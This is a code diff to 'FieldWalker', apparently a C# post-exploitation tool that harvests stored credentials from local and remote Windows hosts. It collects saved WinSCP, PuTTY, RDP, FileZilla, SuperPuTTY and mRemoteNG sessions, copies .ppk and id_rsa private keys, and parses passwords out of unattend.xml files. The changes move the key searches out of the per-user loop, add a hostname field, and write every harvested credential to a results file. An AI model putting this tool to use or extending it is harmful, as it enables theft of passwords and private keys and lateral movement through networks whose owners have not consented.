@@ -68,12 +68,14 @@ namespace FieldWalker
         string sid;
         public string username;
         public List<session> sessions;
+        public string hostname; 
 
-        public UserSessions(string sid, string username)
+        public UserSessions(string sid, string username, string hostname)
         {
             this.sid = sid;
             this.username = username;
             this.sessions = new List<session>();
+            this.hostname = hostname;
         }
     }// end public static class UserSessions
 
@@ -219,6 +221,12 @@ namespace FieldWalker
                     }// end if(previousArgument == "-d")
                 }// end if(arg == "-d")
             }//end foreach (string arg in args)
+
+            if (File.Exists(outputDirectory + @"\results.txt"))
+            {
+                Console.WriteLine("[!] " + outputDirectory + @"\results.txt exists. Please delete the file or choose another output directory [!]");
+                return;
+            }
            
             //if the user supplied a target or target list, run FieldWalker remotely
             if ((target != "") || (computersList != null))
@@ -298,12 +306,12 @@ namespace FieldWalker
                 {
                     if (Regex.Match(user, @"^S-1-5-21-[\d\-]+$", RegexOptions.ECMAScript).Success)
                     {
-                        Console.WriteLine("User on " + target + ": " + user);
+                        Console.WriteLine($"FieldWalking {user} on {target}");
                         //get the username from the SID
                         string accountName = new SecurityIdentifier(user).Translate(typeof(NTAccount)).ToString();
 
                         //add a UserSessions object to the list
-                        userSessions.Add(new UserSessions(user, accountName));
+                        userSessions.Add(new UserSessions(user, accountName, target));
 
                         //look for WinSCP Sessions                        
                         userSessions[numUsers].sessions.AddRange(
@@ -324,7 +332,9 @@ namespace FieldWalker
                         string mRemoteNGPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\mRemoteNG\\confCons.xml";
 
                         //look for remote FileZillaSessions
-                        Console.WriteLine("===> Checking for Remote FileZilla files ");
+                        if (debug)
+                            Console.WriteLine("===> Checking for Remote FileZilla files ");
+
                         if (checkForRemoteFile(FileZillaPath, fileScope, debug))
                         {
                             XElement fileZillaSettings = XElement.Parse((retrieveRemoteFile(FileZillaPath, registryManipulator, processExecutor, target, processScope, debug)));
@@ -346,112 +356,125 @@ namespace FieldWalker
                             userSessions[numUsers].sessions.AddRange(processLocalSuperPuTTYSessions(SuperPuTTYSettings));
                         }
 
-                        //search for .ppk files (PuTTY private keys)
-                        List<string> ppkFiles = findRemoteFilesByExtension("ppk", fileScope, debug);
-                        if(debug)
-                            Console.WriteLine("===> ppkFiles length: " + ppkFiles.Count.ToString());
-
-                        if (ppkFiles != null)
-                        {
-                            foreach (string ppkFile in ppkFiles)
-                            {
-                                Console.WriteLine("===> Retrieving " + ppkFile);
-                                //cull any links
-                                if (ppkFile.IndexOf(".lnk") != -1)
-                                {
-                                    if(debug)
-                                        Console.WriteLine("===> Link found in " + ppkFile + ". Bailing");
-
-                                    continue;
-                                }                
-                                
-                                string fileContent = retrieveRemoteFile(ppkFile, registryManipulator, processExecutor, target, processScope, debug);
-                                
-                                string outFileName = ppkFile.Replace(@"\", "_");
-                                outFileName = outFileName.Replace(":", "_");
-                                string outputFileFullPath = outputDirectory + outFileName;
-                                if(debug)
-                                    Console.WriteLine("===> outputFileFullPath:" + outputFileFullPath);
-
-                                File.WriteAllText(outputFileFullPath, fileContent);
-                                if (verbose)
-                                {
-                                    Console.WriteLine("++++++++++++++++++++> PPK FILE <++++++++++++++++++++");
-                                    Console.WriteLine("===> User: " + user);
-                                    Console.WriteLine("===> Host: " + target);
-                                    Console.WriteLine("===> outFileName:" + outFileName);
-                                    Console.WriteLine(" ");
-                                    Console.WriteLine(fileContent);
-                                    Console.WriteLine(" ");
-                                    Console.WriteLine("++++++++++++++++++++> END PPK FILE <++++++++++++++++++++");
-                                }
-                            }
-                        }
-                        else
-                        {
-                            if(verbose)
-                                Console.WriteLine("===> No PPK files found!");
-                            
-                        }
-
-                        //search for id_rsa files
-                        List<string> idRsaFiles = findRemoteFilesByName("id_rsa", fileScope, debug);
-                        if (idRsaFiles != null)
-                        {
-                            foreach (string idRsaFile in idRsaFiles)
-                            {
-                                //cull any links
-                                if(idRsaFile.IndexOf(".lnk") != -1) 
-                                {
-                                    continue;
-                                }
-                                string fileContent = retrieveRemoteFile(idRsaFile, registryManipulator, processExecutor, target, processScope, debug);
-                                string outFileName = idRsaFile.Replace(@"\", "_");
-                                outFileName = outFileName.Replace(":", "_");
-                                string outputFileFullPath = outputDirectory + outFileName;
-                                File.WriteAllText(outputDirectory + "\\" + outFileName, fileContent);
-                                if (verbose)
-                                {
-                                    Console.WriteLine("++++++++++++++++++++> ID_RSA FILE <++++++++++++++++++++");
-                                    Console.WriteLine("===> User: " + user);
-                                    Console.WriteLine("===> Host: " + target);
-                                    Console.WriteLine("===> outFileName:" + outFileName);
-                                    Console.WriteLine(" ");
-                                    Console.WriteLine(fileContent);
-                                    Console.WriteLine(" ");
-                                    Console.WriteLine("++++++++++++++++++++> END ID_RSA FILE <++++++++++++++++++++");
-                                }
-                            }
-
-                        }//end if (idRsaFiles != null)
-                        else
-                        { 
-                            if (verbose)
-                                Console.WriteLine("===> No id_rsa files found");
                         
-                        }
-
-                        //search for unattend.xml files
-                        List<string> unattendXmlFiles = findRemoteFilesByNameAndExtension("xml", "unattend", fileScope, debug);
-                        if (unattendXmlFiles != null)
-                        {
-                            foreach (string unattendXmlFile in unattendXmlFiles)
-                            {
-                                //cull any links
-                                if (unattendXmlFile.IndexOf(".lnk") != -1)
-                                {
-                                    continue;
-                                }
-                                XElement unattendXmlPasswords = XElement.Parse(retrieveRemoteFile(unattendXmlFile, registryManipulator, processExecutor, target, processScope, debug));
-                                userSessions[numUsers].sessions.AddRange(processLocalUnattendFiles(unattendXmlPasswords, target, "unattend.xml", debug));
-                            }
-                        }
                         numUsers++;
                     }// end if(Regex.Match(user, @"^S-1-5-21-[\d\-]+$", RegexOptions.ECMAScript).Success)
                    
                 }//end foreach (string user in remoteUsers)
 
-            }
+                //Here, we're doing general file searches not tied to a specific user
+                //search for .ppk files (PuTTY private keys)
+                List<string> ppkFiles = findRemoteFilesByExtension("ppk", fileScope, debug);
+                if (debug)
+                    Console.WriteLine("===> ppkFiles length: " + ppkFiles.Count.ToString());
+
+                if (ppkFiles != null)
+                {
+                    foreach (string ppkFile in ppkFiles)
+                    {
+
+                        
+                        //cull any links
+                        if (ppkFile.IndexOf(".lnk") != -1)
+                        {
+                            if (debug)
+                                Console.WriteLine("===> Link found in " + ppkFile + ". Bailing");
+
+                            continue;
+                        }
+
+                        Console.WriteLine($"-> Found {ppkFile}");
+                        
+                        string fileContent = retrieveRemoteFile(ppkFile, registryManipulator, processExecutor, target, processScope, debug);
+
+                        string outFileName = ppkFile.Replace(@"\", "_");
+                        outFileName = outFileName.Replace(":", "_");
+                        string outputFileFullPath = outputDirectory + @"\" + outFileName;
+                        if (debug)
+                            Console.WriteLine("===> outputFileFullPath:" + outputFileFullPath);
+
+                        File.WriteAllText(outputFileFullPath, fileContent);
+                        if (verbose)
+                        {
+                            Console.WriteLine("++++++++++++++++++++> PPK FILE <++++++++++++++++++++");
+                            Console.WriteLine("===> source file: " + ppkFile);
+                            Console.WriteLine("===> Host: " + target);
+                            Console.WriteLine("===> outFileName:" + outFileName);
+                            Console.WriteLine(" ");
+                            Console.WriteLine(fileContent);
+                            Console.WriteLine(" ");
+                            Console.WriteLine("++++++++++++++++++++> END PPK FILE <++++++++++++++++++++");
+                        }
+                    }
+                }
+                else
+                {
+                    if (verbose)
+                        Console.WriteLine("===> No PPK files found!");
+
+                }
+
+                //search for id_rsa files
+                List<string> idRsaFiles = findRemoteFilesByName("id_rsa", fileScope, debug);
+                if (idRsaFiles != null)
+                {
+                    foreach (string idRsaFile in idRsaFiles)
+                    {
+                        //cull any links
+                        if (idRsaFile.IndexOf(".lnk") != -1)
+                        {
+                            continue;
+                        }
+                        Console.WriteLine($"-> Found {idRsaFile}");
+
+                        string fileContent = retrieveRemoteFile(idRsaFile, registryManipulator, processExecutor, target, processScope, debug);
+                        string outFileName = idRsaFile.Replace(@"\", "_");
+                        outFileName = outFileName.Replace(":", "_");
+                        string outputFileFullPath = outputDirectory + @"\" + outFileName;
+                        File.WriteAllText(outputFileFullPath, fileContent);
+                        if (verbose)
+                        {
+                            Console.WriteLine("++++++++++++++++++++> ID_RSA FILE <++++++++++++++++++++");
+                            Console.WriteLine("===> Source file: " + idRsaFile);
+                            Console.WriteLine("===> Host: " + target);
+                            Console.WriteLine("===> outFileName:" + outFileName);
+                            Console.WriteLine(" ");
+                            Console.WriteLine(fileContent);
+                            Console.WriteLine(" ");
+                            Console.WriteLine("++++++++++++++++++++> END ID_RSA FILE <++++++++++++++++++++");
+                        }
+                    }
+
+                }//end if (idRsaFiles != null)
+                else
+                {
+                    if (verbose)
+                        Console.WriteLine("===> No id_rsa files found");
+
+                }
+
+                //search for unattend.xml files
+                //add a UserSessions object to the list - because unattend.xml accounts don't get filed under regular user
+                userSessions.Add(new UserSessions("N/A", "N/A", target));
+                List<string> unattendXmlFiles = findRemoteFilesByNameAndExtension("xml", "unattend", fileScope, debug);
+                if (unattendXmlFiles != null)
+                {
+                    foreach (string unattendXmlFile in unattendXmlFiles)
+                    {
+                        //cull any links
+                        if (unattendXmlFile.IndexOf(".lnk") != -1)
+                        {
+                            continue;
+                        }
+                      
+                        XElement unattendXmlPasswords = XElement.Parse(retrieveRemoteFile(unattendXmlFile, registryManipulator, processExecutor, target, processScope, debug));
+                        userSessions[numUsers].sessions.AddRange(processLocalUnattendFiles(unattendXmlPasswords, target, "unattend.xml", debug));
+                    }//end foreach (string unattendXmlFile in unattendXmlFiles)
+                }//end  if (unattendXmlFiles != null)
+                //because unattend.xml entries get their own "user number" in the sessions list
+                numUsers++;
+
+            }//end if ((target != "") || (computersList != null))
 
             //Run FieldWalker locally
             Console.WriteLine("Running FieldWalker on the local host");
@@ -471,7 +494,7 @@ namespace FieldWalker
                     string accountName = new SecurityIdentifier(userHive).Translate(typeof(NTAccount)).ToString();
 
                     //create a new userSessions object                    
-                    userSessions.Add(new UserSessions(userHive, accountName));
+                    userSessions.Add(new UserSessions(userHive, accountName, "localhost"));
 
                     // we start by looking for credentials in the registry
                     // look for putty sessions
@@ -513,9 +536,7 @@ namespace FieldWalker
                     string FileZillaPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\FileZilla\\sitemanager.xml";
                     string SuperPuTTYPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\Documents\\SuperPuTTY\\Sessions.xml";
                     string mRemoteNGPath = "C:\\Users\\" + accountName.Split('\\')[1] + "\\AppData\\Roaming\\mRemoteNG\\confCons.xml";
-                    //There's six different unattend.xml files
-                    string[] unattends = { "C:\\Windows\\Panther\\unattend.xml", "C:\\Windows\\Panther\\unattended.xml", "C:\\Windows\\Panther\\unattend\\unattend.xml",
-                    "C:\\Windows\\Panther\\unattend\\unattended.xml", "C:\\Windows\\System32\\SysPrep\\unattend.xml", "C:\\Windows\\System32\\SysPrep\\Panther\\unattend.xml"};
+                    
                     
 
                     //debug 
@@ -542,28 +563,48 @@ namespace FieldWalker
                         userSessions[numUsers].sessions.AddRange(processLocalMRemoteNGSessions(mRemoteNGServers));
                     }// end if (File.Exists(mRemoteNGPath))
                     
-                    foreach( string unattendedFile in unattends)
-                    {
-                        if (File.Exists(unattendedFile))
-                        {
-                            userSessions[numUsers].sessions.AddRange(processLocalUnattendFiles(XElement.Load(unattendedFile), "localhost", unattendedFile, debug));
-                        }
-
-                    }//end foreach( string unattendedFile in unattends)
+                    
                     numUsers++;
                 }// end if (userHive.StartsWith("S -1-5-21")
             }// end foreach (string userHive in users)
+             //we search for unattend.xml files separately, so we don't repeat them on a per-user basis
+             //add a UserSessions object to the list - because unattend.xml accounts don't get filed under regular user
+            userSessions.Add(new UserSessions("N/A", "N/A", "localhost"));
+            //There's six different unattend.xml files
+            string[] unattends = { "C:\\Windows\\Panther\\unattend.xml", "C:\\Windows\\Panther\\unattended.xml", "C:\\Windows\\Panther\\unattend\\unattend.xml",
+                    "C:\\Windows\\Panther\\unattend\\unattended.xml", "C:\\Windows\\System32\\SysPrep\\unattend.xml", "C:\\Windows\\System32\\SysPrep\\Panther\\unattend.xml"};
+            foreach (string unattendedFile in unattends)
+            {
+                if (File.Exists(unattendedFile))
+                {
+                    userSessions[numUsers].sessions.AddRange(processLocalUnattendFiles(XElement.Load(unattendedFile), "localhost", unattendedFile, debug));
+                }
+
+            }//end foreach( string unattendedFile in unattends)
+
+            //open an output file
+            string finalOutputFileName = outputDirectory + @"\results.txt";
+            
+
+            Console.WriteLine($"-> Writing results to {finalOutputFileName}");
+
+            Console.WriteLine("-> Final Results");
+
+            var outputLines = new List<string>();
 
             foreach (UserSessions user in userSessions)
             {
-                Console.WriteLine("OUTPUT");
-                Console.WriteLine(">>> " + user.username);
+                
+                Console.WriteLine($">>> Credentials for {user.username} found on {user.hostname}");
+                outputLines.Add($">>> Credentials for {user.username} found on {user.hostname}");
 
                 foreach (session connection in user.sessions)
                 {
                     Console.WriteLine(connection.ToString());
+                    outputLines.Add(connection.ToString());
                 }
             }
+            File.WriteAllLines(finalOutputFileName, outputLines.ToArray());
             Console.WriteLine("End");
 
         }// end static void Main(string[] args)
@@ -858,6 +899,9 @@ namespace FieldWalker
                 string username = "";
                 string password = "";
                 string pvtKeyFile = "";
+
+                Console.WriteLine($"-> Found {winScpRegistrySessions.Length.ToString()} WinSCP sessions");
+
                 foreach (string winScpRegistrySession in winScpRegistrySessions)
                 {
                     hostname = "";
@@ -953,6 +997,8 @@ namespace FieldWalker
                 string username = "";
                 string pvtKeyFile = "";
 
+                Console.WriteLine($"-> Found {puttyRegistrySessions.Length.ToString()} PuTTY sessions");
+
                 foreach (string puttyRegistrySession in puttyRegistrySessions)
                 {
                     hostname = "";
@@ -1030,6 +1076,7 @@ namespace FieldWalker
                 string hostname = "";
                 string username = "";
 
+                Console.WriteLine($"-> Found {rdpRegistrySessions.Length.ToString()} RDP sessions");
 
                 foreach (string rdpRegistrySession in rdpRegistrySessions)
                 {
@@ -1059,6 +1106,8 @@ namespace FieldWalker
         static List<session> processLocalUnattendFiles(XElement UnattendXml, string target, string fileName, Boolean debug)
         {
             List<session> unattendXmlSessions = new List<session>();
+
+            Console.WriteLine($"-> Found {fileName}");
 
             XNamespace unattendNS = "urn:schemas-microsoft-com:unattend";
 
@@ -1106,6 +1155,8 @@ namespace FieldWalker
 
             IEnumerable<XElement> servers = from el in fileZillaSettings.Descendants("Server") select el;
 
+            Console.WriteLine($"-> Found {servers.Count().ToString()} FileZilla sessions");
+
             foreach (XElement server in servers)
             {
                 string hostname = (string)server.Element("Host");
@@ -1124,7 +1175,8 @@ namespace FieldWalker
             List<session> superPuTTYSessions = new List<session>();
             IEnumerable<XElement> servers = from el in SuperPuTTYServers.Descendants("SessionData") select el;
 
-            Console.WriteLine(servers.Count().ToString());
+            Console.WriteLine($"-> Found {servers.Count().ToString()} FileZilla sessions");
+
             foreach (XElement server in servers)
             {
                 Console.WriteLine("Foo");
@@ -1143,7 +1195,8 @@ namespace FieldWalker
             List<session> mRemoteNGSessions = new List<session>();
             IEnumerable<XElement> servers = from el in mRemoteNGServers.Descendants("Node") select el;
 
-            Console.WriteLine(servers.Count().ToString());
+            Console.WriteLine($"-> Found {servers.Count().ToString()} mRemoteNG sessions");
+
             foreach (XElement server in servers)
             {
                 
@@ -1166,6 +1219,10 @@ namespace FieldWalker
             if (sessions.Length == 0)
             {
                 return puttySessions;
+            }
+            else
+            {
+                Console.WriteLine($"-> Found {sessions.Length.ToString()} PuTTY sessions");
             }
             foreach (string session in sessions)
             {
@@ -1212,6 +1269,10 @@ namespace FieldWalker
             {
                 return winScpSessions;
             }
+            else 
+            {
+                Console.WriteLine($"Found {sessions.Length.ToString()} WinSCP Sessions");
+            }
             foreach (string session in sessions)
             {
                 string hostname;
@@ -1251,6 +1312,10 @@ namespace FieldWalker
             if (sessions.Length == 0)
             {
                 return rdpSessions;
+            }
+            else
+            {
+                Console.WriteLine($"-> Found {sessions.Length.ToString()} RDP sessions");
             }
             foreach (string session in sessions)
             {
